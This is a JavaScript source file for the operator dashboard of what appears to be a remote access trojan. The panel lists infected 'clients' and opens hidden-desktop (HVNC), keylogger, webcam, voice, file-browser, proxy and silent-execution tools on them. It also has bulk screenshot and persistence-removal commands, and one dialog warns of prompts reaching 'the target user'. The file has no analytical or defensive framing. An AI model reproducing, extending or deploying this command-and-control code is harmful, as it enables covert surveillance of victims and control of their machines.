import { state } from "./state.js";
import { debounce } from "./utils.js";
import { createRenderer } from "./render.js";
import { openMenu, closeMenu, openModal, wireModalClose, menu } from "./ui.js";
import {
  registerRenderer,
  loadWithOptions,
  startAutoRefresh,
  sendCommand,
  requestPreview,
  requestThumbnail,
} from "./data.js";

const grid = document.getElementById("grid");
const totalPill = document.getElementById("total-pill");
const pageLabel = document.getElementById("page-label");
const prevBtn = document.getElementById("prev");
const nextBtn = document.getElementById("next");
const searchInput = document.getElementById("search");
const sortSelect = document.getElementById("sort");
const filterStatusSelect = document.getElementById("filter-status");
const filterOsSelect = document.getElementById("filter-os");
const showOfflineToggle = document.getElementById("toggle-offline");
const selectAllBtn = document.getElementById("select-all");
const clearSelectionBtn = document.getElementById("clear-selection");
const logoutBtn = document.getElementById("logout-btn");
const usernameDisplay = document.getElementById("username-display");
const roleBadge = document.getElementById("role-badge");
const usersLink = document.getElementById("users-link");
const buildLink = document.getElementById("build-link");
const deployLink = document.getElementById("deploy-link");

const bulkToolbar = document.getElementById("bulk-toolbar");
const selectedCountSpan = document.getElementById("selected-count");
const bulkScreenshotBtn = document.getElementById("bulk-screenshot");
const bulkDisconnectBtn = document.getElementById("bulk-disconnect");
const bulkUninstallBtn = document.getElementById("bulk-uninstall");
const bulkClearBtn = document.getElementById("bulk-clear");
const selectedClients = new Set();
let lastNonOnlineStatus = "all";

let currentUser = null;
let contextCard = null;
let availableOsList = new Set();
const setContext = (id) => {
  contextCard = id;
};
const clearContext = () => {
  contextCard = null;
};

function detectClientPlatform(clientId) {
  if (!clientId) {
    return "unknown";
  }
  const selectorId =
    typeof CSS !== "undefined" && typeof CSS.escape === "function"
      ? CSS.escape(clientId)
      : clientId;
  const card = document.querySelector(`article[data-id="${selectorId}"]`);
  const os = String(card?.dataset?.os || "").toLowerCase();
  if (os.includes("windows")) return "windows";
  if (os.includes("darwin") || os.includes("mac")) return "mac";
  if (os.includes("linux")) return "linux";
  return "unknown";
}

function applyMenuSupportRules(clientId) {
  const platform = detectClientPlatform(clientId);
  const isWindows = platform === "windows";

  const setAvailability = (btn, enabled, reason) => {
    if (!btn) return;
    btn.disabled = !enabled;
    btn.setAttribute("aria-disabled", String(!enabled));
    btn.classList.toggle("opacity-50", !enabled);
    btn.classList.toggle("cursor-not-allowed", !enabled);
    btn.classList.toggle("hover:bg-slate-700", enabled);
    btn.classList.toggle("hover:bg-slate-800/50", !enabled);
    btn.title = enabled ? "" : reason;
  };

  const hvncBtn = menu.querySelector('[data-open="hvnc"]');
  setAvailability(hvncBtn, isWindows, "HVNC is only supported on Windows clients.");

  const webcamBtn = menu.querySelector('[data-open="webcam"]');
  setAvailability(webcamBtn, isWindows, "Webcam viewer is only supported on Windows clients.");

  const keyloggerBtn = menu.querySelector('[data-open="keylogger"]');
  setAvailability(
    keyloggerBtn,
    isWindows,
    "Keylogger capture is only fully supported on Windows clients.",
  );
}

async function loadCurrentUser() {
  try {
    const res = await fetch("/api/auth/me");
    if (res.ok) {
      currentUser = await res.json();
      if (currentUser && currentUser.username && currentUser.role) {
        if (!usernameDisplay || !roleBadge) {
          return;
        }
        usernameDisplay.textContent = currentUser.username;

        const roleBadges = {
          admin: '<i class="fa-solid fa-crown mr-1"></i>Admin',
          operator: '<i class="fa-solid fa-sliders mr-1"></i>Operator',
          viewer: '<i class="fa-solid fa-eye mr-1"></i>Viewer',
        };
        if (roleBadges[currentUser.role]) {
          roleBadge.innerHTML = roleBadges[currentUser.role];
        } else {
          roleBadge.textContent = currentUser.role || "";
        }

        if (currentUser.role === "admin") {
          roleBadge.classList.add(
            "bg-purple-900/50",
            "text-purple-300",
            "border",
            "border-purple-800",
          );
        } else if (currentUser.role === "operator") {
          roleBadge.classList.add(
            "bg-blue-900/50",
            "text-blue-300",
            "border",
            "border-blue-800",
          );
        } else {
          roleBadge.classList.add(
            "bg-slate-700",
            "text-slate-300",
            "border",
            "border-slate-600",
          );
        }

        if (currentUser.role === "admin") {
          usersLink?.classList.remove("hidden");
        }

        if (currentUser.role === "admin" || currentUser.role === "operator") {
          buildLink?.classList.remove("hidden");
        }

        if (currentUser.role === "admin") {
          const pluginsLink = document.getElementById("plugins-link");
          pluginsLink?.classList.remove("hidden");
          deployLink?.classList.remove("hidden");
          document.getElementById("menu-silent-exec")?.classList.remove("hidden");
        }

        const scriptsLink = document.getElementById("scripts-link");
        if (currentUser.role !== "viewer") {
          scriptsLink?.classList.remove("hidden");
        }

        initializeRenderer();
      }

      initializeRenderer();
    } else {
      window.location.href = "/login.html";
    }
  } catch (err) {
    console.error("Failed to load user:", err);
  }
}

async function loadPluginsForClient(clientId) {
  const section = document.getElementById("plugin-section");
  const container = document.getElementById("plugin-menu");
  if (!section || !container) return;
  container.innerHTML = "";
  section.classList.add("hidden");

  try {
    const res = await fetch(`/api/clients/${clientId}/plugins`);
    if (!res.ok) return;
    const data = await res.json();
    const plugins = Array.isArray(data.plugins) ? data.plugins : [];
    if (!plugins.length) return;

    section.classList.remove("hidden");
    for (const plugin of plugins) {
      if (plugin.enabled === false) {
        continue;
      }
      const btn = document.createElement("button");
      btn.className =
        "w-full text-left px-3 py-2 rounded-lg border border-slate-700 bg-slate-800/60 hover:bg-slate-700 text-slate-100 flex items-center gap-2 justify-between";
      btn.dataset.plugin = plugin.id;
      btn.dataset.loaded = plugin.loaded ? "true" : "false";
      if (plugin.lastError) {
        btn.title = `Last error: ${plugin.lastError}`;
      }
      const label = document.createElement("span");
      const labelIcon = document.createElement("i");
      labelIcon.className = "fa-solid fa-puzzle-piece";
      label.appendChild(labelIcon);
      label.append(` ${plugin.name || plugin.id}`);
      const badge = document.createElement("span");
      badge.className =
        "text-[10px] uppercase tracking-wider px-2 py-0.5 rounded-full border" +
        (plugin.loaded
          ? " border-emerald-600 text-emerald-300 bg-emerald-900/40"
          : " border-slate-600 text-slate-300 bg-slate-800/60");
      badge.textContent = plugin.loaded ? "loaded" : "available";
      btn.appendChild(label);
      btn.appendChild(badge);
      container.appendChild(btn);

      if (plugin.loaded) {
        const unloadBtn = document.createElement("button");
        unloadBtn.className =
          "w-full text-left px-3 py-2 rounded-lg border border-red-800 bg-red-900/30 hover:bg-red-800/60 text-red-100 flex items-center gap-2";
        unloadBtn.dataset.pluginUnload = plugin.id;
        const unloadIcon = document.createElement("i");
        unloadIcon.className = "fa-solid fa-plug-circle-xmark";
        const unloadText = document.createElement("span");
        unloadText.textContent = `Unload ${plugin.name || plugin.id}`;
        unloadBtn.appendChild(unloadIcon);
        unloadBtn.appendChild(unloadText);
        container.appendChild(unloadBtn);
      }
    }
  } catch {
    // ignore
  }
}

function initializeRenderer() {
  const { renderMerge } = createRenderer({
    grid,
    totalPill,
    pageLabel,
    openMenu: (id, x, y) => {
      applyMenuSupportRules(id);
      openMenu(id, x, y, setContext);
      loadPluginsForClient(id);
    },
    openModal,
    requestPreview,
    requestThumbnail,
    userRole: currentUser?.role,
  });
  registerRenderer(renderMerge);
  loadWithOptions();
  startAutoRefresh();

  if (typeof anime !== "undefined") {
    anime
      .timeline({ easing: "easeOutQuad" })
      .add({
        targets: "header",
        opacity: [0, 1],
        translateY: [-20, 0],
        duration: 600,
      })
      .add(
        {
          targets: "main > div > div:first-child",
          opacity: [0, 1],
          translateY: [15, 0],
          duration: 500,
        },
        "-=400",
      )
      .add(
        {
          targets: "main > div > div:nth-child(2)",
          opacity: [0, 1],
          translateY: [15, 0],
          duration: 500,
        },
        "-=350",
      );
  }
}

if (logoutBtn && !logoutBtn.dataset.boundLogout) {
  logoutBtn.dataset.boundLogout = "true";
  logoutBtn.addEventListener("click", async () => {
  if (!confirm("Are you sure you want to logout?")) return;

  try {
    const res = await fetch("/api/logout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
    });

    if (res.ok) {
      window.location.href = "/";
    } else {
      alert("Logout failed. Please try again.");
    }
  } catch (err) {
    console.error("Logout error:", err);
    alert("Logout failed. Please try again.");
  }
  });
}

wireModalClose();

const debouncedSearch = debounce(() => {
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true });
}, 200);

searchInput?.addEventListener("input", (e) => {
  state.searchTerm = e.target.value;
  debouncedSearch();
});

sortSelect?.addEventListener("change", (e) => {
  state.sort = e.target.value;
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true });
});

filterStatusSelect?.addEventListener("change", (e) => {
  state.filterStatus = e.target.value;
  if (state.filterStatus === "online") {
    if (showOfflineToggle) showOfflineToggle.checked = false;
  } else {
    lastNonOnlineStatus = state.filterStatus;
    if (showOfflineToggle) showOfflineToggle.checked = true;
  }
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true });
});

filterOsSelect?.addEventListener("change", (e) => {
  state.filterOs = e.target.value;
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true });
});

showOfflineToggle?.addEventListener("change", (e) => {
  if (e.target.checked) {
    state.filterStatus = lastNonOnlineStatus || "all";
  } else {
    if (state.filterStatus !== "online") {
      lastNonOnlineStatus = state.filterStatus;
    }
    state.filterStatus = "online";
  }
  if (filterStatusSelect) {
    filterStatusSelect.value = state.filterStatus;
  }
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true });
});

function updateBulkToolbar() {
  selectedCountSpan.textContent = selectedClients.size;
  if (selectedClients.size > 0) {
    bulkToolbar?.classList.remove("hidden");
  } else {
    bulkToolbar?.classList.add("hidden");
  }
}

function toggleClientSelection(clientId) {
  const checkbox = document.querySelector(
    `.client-checkbox[data-id="${clientId}"]`,
  );
  if (!checkbox) return;

  if (checkbox.checked) {
    selectedClients.add(clientId);
  } else {
    selectedClients.delete(clientId);
  }
  updateBulkToolbar();
}

function syncSelectionState() {
  document.querySelectorAll(".client-checkbox").forEach((cb) => {
    const id = cb.dataset.id;
    if (!id) return;
    cb.checked = selectedClients.has(id);
  });
  updateBulkToolbar();
}

bulkClearBtn?.addEventListener("click", () => {
  selectedClients.clear();
  document
    .querySelectorAll(".client-checkbox")
    .forEach((cb) => (cb.checked = false));
  updateBulkToolbar();
});

clearSelectionBtn?.addEventListener("click", () => {
  selectedClients.clear();
  document
    .querySelectorAll(".client-checkbox")
    .forEach((cb) => (cb.checked = false));
  updateBulkToolbar();
});

selectAllBtn?.addEventListener("click", () => {
  document
    .querySelectorAll(".client-checkbox:not(:disabled)")
    .forEach((cb) => {
      cb.checked = true;
      if (cb.dataset.id) {
        selectedClients.add(cb.dataset.id);
      }
    });
  updateBulkToolbar();
});

bulkScreenshotBtn?.addEventListener("click", async () => {
  if (!confirm(`Take screenshot on ${selectedClients.size} client(s)?`)) return;

  let success = 0;
  for (const clientId of selectedClients) {
    const ok = await sendCommand(clientId, "screenshot");
    if (ok) success++;
  }

  alert(`Screenshots sent to ${success}/${selectedClients.size} clients`);
  selectedClients.clear();
  document
    .querySelectorAll(".client-checkbox")
    .forEach((cb) => (cb.checked = false));
  updateBulkToolbar();
  setTimeout(() => loadWithOptions({ force: true }), 400);
});

bulkDisconnectBtn?.addEventListener("click", async () => {
  if (
    !confirm(
      `Disconnect ${selectedClients.size} client(s)? This will close their connections.`,
    )
  )
    return;

  let success = 0;
  for (const clientId of selectedClients) {
    const ok = await sendCommand(clientId, "disconnect");
    if (ok) success++;
  }

  alert(`Disconnected ${success}/${selectedClients.size} clients`);
  selectedClients.clear();
  document
    .querySelectorAll(".client-checkbox")
    .forEach((cb) => (cb.checked = false));
  updateBulkToolbar();
  setTimeout(() => loadWithOptions({ force: true }), 1000);
});

bulkUninstallBtn?.addEventListener("click", async () => {
  if (
    !confirm(
      `Uninstall agent from ${selectedClients.size} client(s)?\n\nThis will remove all persistence mechanisms and terminate the agents. This action cannot be undone.`,
    )
  )
    return;

  let success = 0;
  for (const clientId of selectedClients) {
    const ok = await sendCommand(clientId, "uninstall");
    if (ok) success++;
  }

  alert(`Uninstall sent to ${success}/${selectedClients.size} clients`);
  selectedClients.clear();
  document
    .querySelectorAll(".client-checkbox")
    .forEach((cb) => (cb.checked = false));
  updateBulkToolbar();
  setTimeout(() => loadWithOptions({ force: true }), 1000);
});

window.toggleClientSelection = toggleClientSelection;
window.isClientSelected = (clientId) => selectedClients.has(clientId);
window.syncClientSelection = syncSelectionState;
window.removeClientFromDashboard = async (clientId) => {
  if (!clientId) return false;
  try {
    const res = await fetch(`/api/clients/${clientId}`, {
      method: "DELETE",
      headers: { "Content-Type": "application/json" },
    });
    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      alert(data.error || "Failed to remove client from dashboard");
      return false;
    }
    selectedClients.delete(clientId);
    return true;
  } catch (err) {
    console.error(err);
    alert("Failed to remove client from dashboard");
    return false;
  }
};

window.banClient = async (clientId) => {
  if (!clientId) return;
  if (!confirm(`Ban IP for ${clientId} and block future connections?`)) return;
  try {
    const res = await fetch(`/api/clients/${clientId}/ban`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
    });
    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      alert(data.error || "Failed to ban client IP");
      return;
    }
    const data = await res.json().catch(() => ({}));
    alert(`Banned IP ${data.ip || ""}`.trim());
    setTimeout(() => loadWithOptions({ force: true }), 400);
  } catch (err) {
    console.error(err);
    alert("Failed to ban client IP");
  }
};

prevBtn?.addEventListener("click", () => {
  if (state.page > 1) {
    state.page -= 1;
    state.lastDigest = "";
    loadWithOptions({ force: true });
  }
});

nextBtn?.addEventListener("click", () => {
  state.page += 1;
  state.lastDigest = "";
  loadWithOptions({ force: true });
});

window.addEventListener("click", (e) => {
  const target = e.target;
  if (target.closest && target.closest(".command-btn")) return;
  if (target.closest && target.closest(".modal")) return;
  if (menu.contains(target)) return;
  closeMenu(clearContext);
});

menu.addEventListener("click", async (e) => {
  const target = e.target.closest("button");
  if (!target || !contextCard) return;
  if (target.disabled || target.getAttribute("aria-disabled") === "true") {
    return;
  }
  const pluginId = target.dataset.plugin;
  if (pluginId) {
    try {
      const res = await fetch(`/api/clients/${contextCard}/plugins/${pluginId}/load`, {
        method: "POST",
      });
      if (!res.ok) {
        const text = await res.text();
        alert(`Plugin load failed: ${text}`);
        closeMenu(clearContext);
        return;
      }
      window.open(`/plugins/${pluginId}?clientId=${contextCard}`, "_blank", "noopener");
    } catch (err) {
      alert("Plugin load failed");
    }
    closeMenu(clearContext);
    return;
  }
  const unloadId = target.dataset.pluginUnload;
  if (unloadId) {
    await fetch(`/api/clients/${contextCard}/plugins/${unloadId}/unload`, {
      method: "POST",
    });
    closeMenu(clearContext);
    return;
  }
  const open = target.dataset.open;
  if (open === "console") {
    window.open(`/${contextCard}/console`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "remotedesktop") {
    window.open(`/remotedesktop?clientId=${contextCard}`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "webcam") {
    window.open(`/webcam?clientId=${contextCard}`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "hvnc") {
    window.open(`/hvnc?clientId=${contextCard}`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "files") {
    const platform = detectClientPlatform(contextCard);
    if (platform !== "windows") {
      const proceed = confirm(
        "Opening File Browser may show a permission prompt to the target user on their machine. Continue?",
      );
      if (!proceed) {
        closeMenu(clearContext);
        return;
      }
    }
    window.open(`/${contextCard}/files`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "processes") {
    window.open(`/${contextCard}/processes`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "keylogger") {
    window.open(`/${contextCard}/keylogger`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "proxy") {
    window.open(`/${contextCard}/proxy`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  if (open === "silent-exec") {
    window.open(`/deploy?clientId=${contextCard}`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }
  const action = target.dataset.action;

  if (open === "voice") {
    window.open(`/voice?clientId=${contextCard}`, "_blank", "noopener");
    closeMenu(clearContext);
    return;
  }

  if (action === "uninstall") {
    if (
      !confirm(
        `Uninstall agent from ${contextCard}?\n\nThis will remove all persistence mechanisms and terminate the agent. This action cannot be undone.`,
      )
    ) {
      closeMenu(clearContext);
      return;
    }
  } else if (action === "disconnect") {
    if (
      !confirm(
        `Disconnect ${contextCard}?\n\nThis will terminate the agent connection.`,
      )
    ) {
      closeMenu(clearContext);
      return;
    }
  } else if (action === "remove-dashboard") {
    if (
      !confirm(
        `Remove ${contextCard} from the dashboard list?\n\nUse this for stale clients that are already gone. If that client reconnects later, it will appear again.`,
      )
    ) {
      closeMenu(clearContext);
      return;
    }

    const removed = await window.removeClientFromDashboard(contextCard);
    if (removed) {
      updateBulkToolbar();
      setTimeout(() => loadWithOptions({ force: true }), 200);
    }
    closeMenu(clearContext);
    return;
  }

  const ok = await sendCommand(contextCard, action);
  if (ok) {
    setTimeout(() => loadWithOptions({ force: true }), 400);
  }
  closeMenu(clearContext);
});

loadCurrentUser();
